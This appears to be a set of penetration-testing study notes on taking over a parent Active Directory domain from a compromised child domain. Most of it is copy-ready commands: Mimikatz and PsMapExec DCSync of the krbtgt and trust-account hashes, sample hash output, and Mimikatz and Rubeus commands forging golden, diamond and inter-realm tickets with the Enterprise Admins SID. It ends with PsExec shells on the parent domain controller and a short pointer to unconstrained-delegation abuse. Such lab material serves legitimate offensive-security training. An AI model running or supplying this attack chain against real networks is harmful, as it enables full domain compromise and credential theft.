# Extra SIDs / Raise Child

## Obtain krbtgt account hash in child domain
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt"'
PsMapExec -Targets DC -Domain prod.corp1.com -Method dcsync -Option "dcsync:prod\krbtgt" -Username admin -Password lab -ShowOutput
```
```bash
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 4/20/2020 2:26:58 AM
Object Security ID   : S-1-5-21-634106289-3621871093-708134407-502
Object Relative ID   : 502

Credentials:
  Hash NtLm: cce9d6cd94eb31ccfbb7cc8eeadf7ce1 # <-- for Rubeus and Mimikatz golden tickets
    ntlm- 0: cce9d6cd94eb31ccfbb7cc8eeadf7ce1
    lm  - 0: 8670ff0cf0a819ea518fd447a9955d4e

<-- Snip -->

Primary:Kerberos-Newer-Keys
SAlT (defAuLt) : PROD.CORP1.COMkrbtgt
Default Iterations : 4096
Credentials
aes256_hmaC     (4096) : 6d5a5cb31e334c8417e4bfd8a1f85f022355355479648cff37a5dac989e # <-- for Rubeus Diamond ticket
Aes128_HMAC     (4096) : aa6e758536a48483b6ff9a80af2a6c80
des_cbc_md5     (4096) : 4fc7ce40f438674c
```
## Create Golden / diamond ticket
```powershell
# Obtain Domain SIDs for both the child and parent domain
(New-Object System.Security.Principal.SecurityIdentifier((([ADSI]("LDAP://prod.corp1.com")).objectSID)[0], 0)).Value
(New-Object System.Security.Principal.SecurityIdentifier((([ADSI]("LDAP://corp1.com")).objectSID)[0], 0)).Value

# Mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:fake /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /krbtgt:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /ptt"'

# Rubeus Golden
Invoke-Rubeus -Command "golden /aes256:[aes256 hash] /user:Administrator /domain:corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /nowrap"
Invoke-Rubeus -Command "golden /rc4:[rc4 hash] /user:Administrator /domain:corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /nowrap"

# Rubeus Diamond
Invoke-Rubeus -Command "diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /krbkey:[krbtgt aes256 hash] /nowrap"
```
# Inter-Realm TGT
## Obtain trust key
```powershell
# Obtain trust account hash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\corp1$ /domain:domain /dc:dc"'
PsMapExec -Method DCSync -Targets DC -option "dcsync:prod\corp1$" -username admin -password lab -domain prod.corp1.com
```
## Forge the Inter-Realm TGT
The trust key can then be used to forge an inter-realm TGT to the parent domain `corp1.com`. Mimikatz is used initially
```powershell
# Obtain Domain SIDs for both the child and parent domain
(New-Object System.Security.Principal.SecurityIdentifier((([ADSI]("LDAP://prod.corp1.com")).objectSID)[0], 0)).Value
(New-Object System.Security.Principal.SecurityIdentifier((([ADSI]("LDAP://corp1.com")).objectSID)[0], 0)).Value

# Use Mimikatz to forge the inter-realm TGT and save .kirbi to disk
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /rc4:d6eba9e9b9bb466be9d9d20c5584c9ef /service:krbtgt /target:corp1.com /sids:S-1-5-21-1587569303-1110564223-1586047116-519"'

# Used the saved .kirbi ticket file to request a service ticket for the cifs service against
# the parent domain domain controller
Invoke-Rubeus -Command "asktgs /ticket:ticket.kirbi /service:cifs/rdc01.corp1.com /dc:rdc01.corp1.com /nowrap" 
```
## Compromise the DC
After performing the above with Rubeus we can validate the requested service ticket and compromise the DC
```powershell
# Validate if CIFS ticket is valid
ls \\rdc01.corp1.com\c$

# Get SMB Shell
Invoke-SMBRemoting -ComputerName 'rdc01.corp1.com\'
PsExec64.exe \\rdc01.corp1.com\ cmd
```
# Unconstrained Delegation Abuse
If we have compromised a system configured with Unconstrained Delegation, it may be trivial to use this to gain access to an alternate forest or domain by coercing authentication from a user or machine account in the target foresst to authenticate to our compromised system with unconstrained delegation.

Following the steps here: https://github.com/The-Viper-One/OSEP-Notes/tree/main/Active_Directory/Kerberos_Delegation/Unconstrained.

## Note

In 2019, Microsoft issued two rounds of security advisories and updates The first blocked TGT delegation for all new forest trusts, while the second blocked it for existing forest trust as well.

